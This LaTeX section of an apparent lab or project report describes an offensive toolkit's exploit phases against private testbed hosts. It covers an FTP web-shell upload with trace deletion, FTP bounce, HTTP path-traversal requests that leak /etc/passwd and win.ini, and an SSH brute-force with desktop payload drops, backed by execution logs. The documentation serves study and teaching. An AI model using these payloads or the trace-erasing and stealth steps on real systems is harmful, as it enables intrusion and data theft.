%========================================================= SECTION 5: EXPLOITS & ATTACKS
\section{Phase 4 \& 5: Dynamic OS-Aware Weaponization and Exploit Methodologies}\label{sec:exploits}

Reconnaissance provides actionable intelligence only when tightly coupled to weaponization. In our
architecture, Phase~4 bridges discovery to exploitation by adapting attack payloads to the detected
target operating system family, after which Phase~5 executes targeted proof-of-concept exploits.

\subsection{Phase 4: Dynamic OS-Aware Payload Selection Methodology}
Rather than executing static, single-platform payloads, the toolkit queries the Phase~3 OS verdict
and dynamically selects compatible attack configurations:
\begin{itemize}
    \item \textbf{Microsoft Windows Target Family:} Selects Windows configuration paths (such as
    \texttt{windows\textbackslash win.ini}) and Windows system audit commands (\texttt{whoami},
    \texttt{hostname}, \texttt{ipconfig}, \texttt{cmd.exe /c ver}).
    \item \textbf{Unix / Linux / POSIX Target Family:} Selects POSIX file path targets
    (\texttt{/etc/passwd}, \texttt{/etc/shadow}) and standard Unix administration commands
    (\texttt{id}, \texttt{uname -a}, \texttt{cat /etc/issue}).
\end{itemize}

\subsection{Phase 5: Targeted Exploit Methodologies \& In-Depth Execution Logs}

\subsubsection{FTP Exploit Suite (Three Concrete Attack Vectors)}
The FTP exploit suite implements three distinct attack vectors against exposed port~21 listeners:
\begin{enumerate}
    \item \textbf{FTP Anonymous Authentication \& Directory Enumeration:} Interrogates the server
    using RFC~959 default credentials (\texttt{anonymous} / \texttt{anon@lab}). Upon receiving
    return code 230 (\textit{User logged in}), the client queries current working directory via
    \texttt{PWD}, switches to passive data mode via \texttt{PASV}, and retrieves directory listings
    via \texttt{LIST} to identify accessible directories (such as \texttt{/pub} and \texttt{/uploads}).
    \item \textbf{FTP Write $\rightarrow$ Web Shell Upload $\rightarrow$ HTTP CGI RCE:} Validates
    write permissions on the target's web-accessible upload directory, uploads a custom executable
    script (\texttt{shell.py}) via \texttt{STOR}, dispatches an HTTP request
    (\texttt{GET /uploads/shell.py?cmd=<os\_cmd>}) to execute the payload under the web server's CGI
    interpreter, captures stdout, and immediately executes \texttt{DELE shell.py} to erase forensic
    traces.
    \item \textbf{RFC 959 FTP Bounce Attack Pivot:} Attempts to exploit the FTP control channel
    as an arbitrary TCP proxy. The client establishes an unauthenticated session on port~21 and issues
    an RFC~959 \texttt{PORT $h_1,h_2,h_3,h_4,p_1,p_2$} directive instructing the daemon to initiate
    an active data connection toward an internal service (\texttt{192.168.0.116:80}). A subsequent
    \texttt{LIST} command attempts to induce the daemon into performing a third-party port probe on behalf
    of the attacker. In our empirical testbed, this exploit was \hl{cleanly mitigated} by the host OS kernel
    filter (\texttt{WinError 10053}). A systematic analytical assessment covering attack process,
    underlying assumptions, and divergence analysis is detailed in
    Section~\ref{sec:results} (Table~\ref{tab:attack_observations}).
\end{enumerate}

\begin{figure}[htbp]
\centering
\begin{minipage}[t]{0.485\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (a) Exploit: FTP Write $\to$ Web-Shell CGI RCE}\\[2pt]
\begin{tikzpicture}[font=\sffamily\scriptsize, scale=0.72, every node/.style={transform shape}]
    \node[draw=accent, fill=accentsoft, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=1.6cm] (e) at (0, 0) {Exploit Engine};
    \node[draw=rule, fill=codebg, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=1.6cm] (s) at (3.8, 0) {FTP Server (:21)};
    \draw[thick, color=accent] (e.south) -- (0, -3.7);
    \draw[thick, color=rule] (s.south) -- (3.8, -3.7);
    \draw[-{Stealth[length=4pt]}, thick] (0, -0.45) -- node[above, sloped, font=\tiny\ttfamily] {STOR uploads/shell.py} (3.8, -0.85);
    \draw[-{Stealth[length=4pt]}, thick, color=accent] (3.8, -1.1) -- node[above, sloped, font=\tiny] {226 Transfer Complete} (0, -1.5);
    \draw[-{Stealth[length=4pt]}, thick] (0, -1.8) -- node[above, sloped, font=\tiny\ttfamily] {HTTP GET /uploads/shell.py?cmd=whoami} (3.8, -2.2);
    \draw[-{Stealth[length=4pt]}, thick, color=accent] (3.8, -2.45) -- node[above, sloped, font=\tiny] {RCE Output: homed01\textbackslash turjo} (0, -2.85);
    \draw[-{Stealth[length=4pt]}, thick] (0, -3.1) -- node[above, sloped, font=\tiny\ttfamily] {DELE uploads/shell.py} (3.8, -3.45);
\end{tikzpicture}
\end{minipage}%
\hfill
\begin{minipage}[t]{0.485\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (b) Exploit: FTP Bounce Mitigation}\\[2pt]
\begin{tikzpicture}[font=\sffamily\scriptsize, scale=0.72, every node/.style={transform shape}]
    \node[draw=accent, fill=accentsoft, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=1.6cm] (e) at (0, 0) {Exploit Engine};
    \node[draw=rule, fill=codebg, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=1.6cm] (s) at (3.8, 0) {Target Host};
    \draw[thick, color=accent] (e.south) -- (0, -3.7);
    \draw[thick, color=rule] (s.south) -- (3.8, -3.7);
    \draw[-{Stealth[length=4pt]}, thick] (0, -0.5) -- node[above, sloped, font=\tiny\ttfamily] {PORT 192,168,0,116,0,80} (3.8, -1.0);
    \node[draw=accentstrong, fill=accentsoft, rounded corners=2pt, font=\tiny\bfseries, align=center, text=accentstrong] at (1.9, -1.75) {
        \textbf{WFP Socket Policy Check}\\Cross-Host Port Pivot Aborted
    };
    \draw[-{Stealth[length=4pt]}, thick, color=accentstrong] (3.8, -2.5) -- node[above, sloped, font=\tiny] {500 WinError 10053 (Aborted)} (0, -3.0);
    \node[draw=rule, fill=codebg, rounded corners=2pt, font=\tiny\bfseries, align=center] at (1.9, -3.45) {Outcome: \textbf{MITIGATED BY HOST STACK}};
\end{tikzpicture}
\end{minipage}
\vspace{-2pt}
\caption{Protocol Interactions for FTP Web-Shell RCE and Host Firewall Bounce Mitigation.}
\label{fig:timing_ftp}
\end{figure}

\FloatBarrier
\paragraph{Empirical Evidence: FTP Exploit Suite Execution Telemetry.}
The execution telemetry for each individual FTP attack vector against the target environment is
detailed in the following dedicated records:

\begin{logbox}
=================================================================
  [EXPLOIT 1] FTP Anonymous Authentication & Directory Enumeration
=================================================================
  Target Host : 192.168.0.116:21 (LabFTP Server)
  Credentials : anonymous / anon@lab
  Return Code : 230 User logged in, proceed.
  Status      : SUCCESS [OK]
-----------------------------------------------------------------
  Remote Directory Listing (PASV -> LIST):
    -rw-r--r-- 1 ftp ftp 232 Jan 01 00:00 index.html
    drwxr-xr-x 1 ftp ftp   0 Jan 01 00:00 pub
    drwxr-xr-x 1 ftp ftp   0 Jan 01 00:00 uploads (Write Permission Confirmed)
=================================================================

=================================================================
  [EXPLOIT 2] FTP Write -> Web Shell Upload -> HTTP CGI RCE
=================================================================
  Target Host : 192.168.0.116 (Ports 21 [FTP] + 80 [HTTP])
  Payload     : uploads/shell.py
  Status      : SUCCESS [OK] (Remote Code Execution Verified)
-----------------------------------------------------------------
  Execution Workflow Trace:
    [OK] FTP Login       : 230 User logged in.
    [OK] FTP CWD         : Changed to /uploads directory.
    [OK] Write Check     : PASV write permission validated.
    [OK] Script Upload   : STOR uploads/shell.py -> 226 Transfer complete.
    [OK] HTTP Trigger    : GET /uploads/shell.py?cmd=whoami HTTP/1.0
  Server Execution Output:
    ==================================================
    WEB SHELL - SANDBOXED EXECUTION
    ==================================================
    Host OS      : Windows 11
    Command key  : whoami
    Executed     : whoami
    --------------------------------------------------
    homed01\turjo
    --------------------------------------------------
    Status: SUCCESS
    ==================================================
  Forensic Cleanup:
    [OK] FTP DELE uploads/shell.py -> 250 File deleted successfully.
=================================================================

=================================================================
  [EXPLOIT 3] RFC 959 FTP Bounce Attack Socket Relay Mitigation
=================================================================
  Control Channel: 192.168.0.116:21
  Pivot Target   : 192.168.0.116:80 (HTTP Port Relay)
  Command Issued : PORT 192,168,0,116,0,80
  Observed Return: 500 Connection error: [WinError 10053]
  Status         : FAILED (MITIGATED BY HOST OS) [X]
-----------------------------------------------------------------
  Mitigation Root Cause:
    An established connection was aborted by the software in your
    host machine. The Windows Filtering Platform (WFP) stateful
    engine detected and blocked cross-interface socket relay.
=================================================================
\end{logbox}

\subsubsection{HTTP Directory Traversal Methodology}

\noindent
\begin{minipage}[t]{0.485\textwidth}
\vspace{0pt}
The web exploitation module assesses unauthenticated path traversal vulnerabilities across three distinct path encodings: standard backslash path separation (\texttt{..\textbackslash ..\textbackslash win.ini}), POSIX forward-slash traversal (\texttt{../../win.ini}), and URL-encoded representations (\texttt{..\%5c..\%5cwin.ini}).

The engine dynamically adapts payloads based on Phase~3 OS attribution (Windows \texttt{win.ini} vs.\ POSIX \texttt{/etc/passwd}) and traverses outside the uncanonicalized web root to exfiltrate critical system configuration files.
\end{minipage}%
\hfill
\begin{minipage}[t]{0.485\textwidth}
\centering
\vspace{0pt}
\resizebox{\linewidth}{!}{%
\begin{tikzpicture}[font=\sffamily\scriptsize]
    \node[draw=accent, fill=accentsoft, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=2.0cm] (e) at (0, 0) {Exploit Engine};
    \node[draw=rule, fill=codebg, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=2.0cm] (s) at (5.4, 0) {HTTP Server (:80)};
    \draw[thick, color=accent] (e.south) -- (0, -3.8);
    \draw[thick, color=rule] (s.south) -- (5.4, -3.8);
    \draw[-{Stealth[length=4pt]}, thick] (0, -0.5) -- node[above, sloped, font=\tiny\ttfamily] {GET /..\textbackslash..\textbackslash windows\textbackslash win.ini} (5.4, -1.0);
    \node[draw=accentstrong, fill=accentsoft, rounded corners=2pt, font=\tiny\bfseries, align=center, text=accentstrong] at (2.7, -1.6) {
        \textbf{Missing Path Canonicalization}
    };
    \draw[-{Stealth[length=4pt]}, thick, color=accent] (5.4, -2.2) -- node[above, sloped, font=\tiny\ttfamily] {200 OK [Exfiltrated Content]} (0, -2.7);
    \draw[-{Stealth[length=4pt]}, thick] (0, -3.2) -- node[above, sloped, font=\tiny] {Connection Closed (Stateless)} (5.4, -3.5);
\end{tikzpicture}%
}
\vspace{-2pt}
\captionof{figure}{Protocol Sequence of HTTP Path Traversal Exploit.}
\label{fig:timing_http}
\end{minipage}

\FloatBarrier
\paragraph{Empirical Evidence: HTTP Directory Traversal Execution Records.}
The path traversal engine was evaluated against both Windows and Linux hosts, automatically adapting
the path separators and system targets:

\begin{logbox}
=================================================================
  [EXPLOIT 4a] HTTP Directory Traversal on Windows Host (192.168.0.116)
=================================================================
  Target Host : 192.168.0.116:80 (VulnHTTP/1.0 Server)
  Target File : windows\win.ini
  Status      : SUCCESS [OK] (All 3 Encodings Confirmed Vulnerable)
-----------------------------------------------------------------
  Vector 1 (Standard Backslash):
    GET /..\..\..\..\..\windows\win.ini HTTP/1.0 -> 200 OK
  Vector 2 (POSIX Separator):
    GET /../../../../../../../windows/win.ini HTTP/1.0 -> 200 OK
  Vector 3 (URL Hex-Encoded):
    GET /..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini HTTP/1.0 -> 200 OK
-----------------------------------------------------------------
  Exfiltrated File Content (Preview):
    [fonts]
    Arial=arial.ttf
    Courier New=cour.ttf
    [extensions]
=================================================================

=================================================================
  [EXPLOIT 4b] Dynamic POSIX HTTP Path Traversal on Linux (192.168.56.101)
=================================================================
  Target Host : 192.168.56.101:80 (Apache/2.4.68 Debian)
  Target File : /etc/passwd (Dynamically Swapped via Phase 3 Attribution)
  Status      : SUCCESS [OK]
-----------------------------------------------------------------
  Vector Executed:
    GET /../../../../../../../etc/passwd HTTP/1.0 -> 200 OK
-----------------------------------------------------------------
  Exfiltrated File Content (Preview):
    root:x:0:0:root:/root:/usr/bin/zsh
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    kali:x:1000:1000:Kali Linux User,,,:/home/kali:/usr/bin/zsh
=================================================================
\end{logbox}

\subsubsection{SSH Weak-Credential Brute-Force \& Multi-Modal Visual Showcase}
The SSH exploit targets port~22 using a bounded dictionary of 20 high-probability enterprise
credentials. Protocol key-exchange and encrypted session negotiation are handled via \texttt{paramiko}
due to cryptography complexity, but the brute-force dispatch, rate limiting, and multi-modal
post-exploitation routines are self-authored:
\begin{itemize}
    \item \textbf{Quiet Mode (Stealth Reconnaissance):} Dispatches non-destructive audit commands
    (\texttt{whoami}, \allowbreak\texttt{hostname}, \allowbreak\texttt{ipconfig}, \allowbreak\texttt{ver}) without modifying the file
    system or alerting the user.
    \item \textbf{Loud Mode (Multi-Modal Proof of Compromise):} Upon authentication as
    \texttt{test:test123} on attempt 15/20, the engine deploys three interactive artefacts to the
    victim's desktop and triggers a speech synthesizer alert:
    \begin{enumerate}
        \item \textbf{Trophy File (\texttt{PROOF\_OF\_ACCESS.txt}):} Placed directly on the victim's
        Desktop, recording hostname, user account, timestamp, and RCE confirmation text.
        \item \textbf{Remote Script (\texttt{hacked.py}):} Python payload script capable of being
        executed from the remote console.
        \item \textbf{Interactive Attack Window (\texttt{HACKED.bat} / \texttt{HACKED.exe}):} Compiled
        natively via Windows \texttt{csc.exe} and deployed to Desktop. When launched, it displays a
        neon-green matrix console running an automated 1000-iteration compromise loop.
        \item \textbf{Physical Audio Alert:} Invokes Windows \texttt{System.Speech.Synthesis} to vocalize
        an audible warning on the victim PC speakers.
    \end{enumerate}
\end{itemize}

\noindent
\begin{minipage}[t]{0.485\textwidth}
\centering
\vspace{0pt}
\resizebox{\linewidth}{!}{%
\begin{tikzpicture}[font=\sffamily\scriptsize]
    \node[draw=accent, fill=accentsoft, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=2.0cm] (c) at (0, 0) {Exploit Engine};
    \node[draw=rule, fill=codebg, rounded corners=2pt, font=\bfseries, inner sep=2.5pt, minimum width=2.0cm] (s) at (5.4, 0) {SSH Daemon (:22)};
    \draw[thick, color=accent] (c.south) -- (0, -4.1);
    \draw[thick, color=rule] (s.south) -- (5.4, -4.1);

    % Step 1: Handshake
    \draw[-{Stealth[length=4pt]}, thick] (0, -0.4) -- node[above, sloped, font=\tiny] {SSH-2.0 Key Exchange (DH + RSA)} (5.4, -0.75);
    \draw[-{Stealth[length=4pt]}, thick, color=accent] (5.4, -0.95) -- node[above, sloped, font=\tiny] {Encrypted Session Established} (0, -1.3);

    % Step 2: Bounded Dictionary
    \draw[-{Stealth[length=4pt]}, thick] (0, -1.65) -- node[above, sloped, font=\tiny\ttfamily] {Attempts 1..14 $\to$ USERAUTH\_FAILURE} (5.4, -2.0);
    \draw[-{Stealth[length=4pt]}, thick, color=accentstrong] (0, -2.35) -- node[above, sloped, font=\tiny\ttfamily\bfseries] {Attempt 15: test:test123 $\to$ SUCCESS} (5.4, -2.7);

    % Step 3: Dual Mode Execution
    \node[draw=accent, fill=accentsoft, rounded corners=2pt, font=\tiny\bfseries, align=center, inner sep=2pt] at (2.7, -3.1) {
        \textbf{Quiet Mode:} Audit Commands (\texttt{whoami}...)
    };
    \draw[-{Stealth[length=4pt]}, thick] (0, -3.5) -- node[above, sloped, font=\tiny\ttfamily] {Loud Mode: Deploy Artefacts \& Loop} (5.4, -3.75);
    \draw[-{Stealth[length=4pt]}, thick, color=accentstrong] (0, -3.95) -- node[above, sloped, font=\tiny] {Speech Synthesizer Alert on Speakers} (5.4, -4.1);
\end{tikzpicture}%
}
\vspace{-3pt}
\captionof{figure}{Protocol Sequence of SSH Brute-Force and Exploitation.}
\label{fig:timing_ssh}
\end{minipage}%
\hfill
\begin{minipage}[t]{0.485\textwidth}
\vspace{0pt}
\begin{keypoint}[Demonstration Video \& Evidence]
A complete live screen-recording of the SSH loud-mode exploitation demonstrating real-time credential cracking, automated desktop file drop, interactive matrix console popup, and audible synthesized speech alert is hosted at:
\begin{center}
\textbf{\url{https://youtu.be/b88qOQ53G3M}}\\[1pt]
\textsf{\scriptsize (Live Demonstration Video)}
\end{center}
Definitive photographic evidence across the attack lifecycle is presented below in Figure~\ref{fig:ssh_desktop_transition}.
\end{keypoint}
\end{minipage}

\vspace{4pt}

\noindent
\begin{minipage}{\textwidth}
\centering
\begin{minipage}[t]{0.46\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (a) Victim Desktop Prior to Payload Delivery}\\[1pt]
\shotscreenshot[\linewidth]{rsc/normal.png}{Victim Desktop in baseline clean state prior to exploit dispatch.}
\end{minipage}%
\hfill
\begin{minipage}[t]{0.46\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (b) Victim Desktop Post-Exploitation (Popped)}\\[1pt]
\shotscreenshot[\linewidth]{rsc/payload.png}{Victim Desktop displaying dropped files: \texttt{PROOF\_OF\_ACCESS.txt}, \texttt{hacked.py}, \texttt{HACKED.bat}, and \texttt{HACKED.exe}.}
\end{minipage}

\vspace{2pt}

\begin{minipage}[t]{0.305\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (c) Intrusion Proof Trophy}\\[1pt]
\shotscreenshot[\linewidth]{rsc/proof_of_access.png}{\texttt{PROOF\_OF\_ACCESS.txt} in Notepad.}
\end{minipage}%
\hfill
\begin{minipage}[t]{0.305\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (d) Interactive Attack Window}\\[1pt]
\shotscreenshot[\linewidth]{rsc/batch_file.png}{\texttt{HACKED.bat} attack console loop.}
\end{minipage}%
\hfill
\begin{minipage}[t]{0.305\textwidth}
\centering
{\color{accent}\sffamily\bfseries\scriptsize (e) CLI Executable Script}\\[1pt]
\shotscreenshot[\linewidth]{rsc/script.png}{\texttt{hacked.py} payload executed on victim.}
\end{minipage}
\vspace{-2pt}
\captionof{figure}{Empirical Visual Evidence of SSH Compromise: Desktop State Transition and Post-Exploitation Artefacts on Target Workstation (\texttt{192.168.1.104}).}
\label{fig:ssh_desktop_transition}
\label{fig:ssh_artefacts}
\end{minipage}

\vspace{3pt}
\paragraph{Empirical Evidence: SSH Credential Audit \& Post-Exploitation Telemetry.}
The complete operational log for the dictionary attack, silent reconnaissance, and loud-mode
multi-modal payload deployment is recorded below:

\begin{logbox}
=================================================================
  [EXPLOIT 5] SSH Weak-Credential Brute-Force & Multi-Modal Compromise
=================================================================
  Target Host : 192.168.1.104 (AisheePC Windows 11 Desktop) | Port: 22
  Wordlist    : Bounded 20-pair credential matrix (delay=1.0s)
  Cracked Auth: test:test123 (Attempt 15/20) | Status: SUCCESS [OK]
-----------------------------------------------------------------
  Silent Reconnaissance Command Telemetry (Remote STDOUT):
    whoami   -> aisheepc\test  |  hostname -> AisheePC
    ipconfig -> 169.254.17.114, 169.254.58.27, 192.168.1.104
    os_info  -> Microsoft Windows [Version 10.0.26200.9445]
-----------------------------------------------------------------
  Loud-Mode Multi-Modal Post-Exploitation Actions:
    [OK] Trophy File   : PROOF_OF_ACCESS.txt deployed to Desktop
    [OK] Payload Script: hacked.py deployed to Desktop
    [OK] Interactive UI: HACKED.bat & HACKED.exe launched (1000-Loop Matrix)
    [OK] Speech Alert  : Synthesized physical audio alert sounded on speakers
=================================================================
\end{logbox}

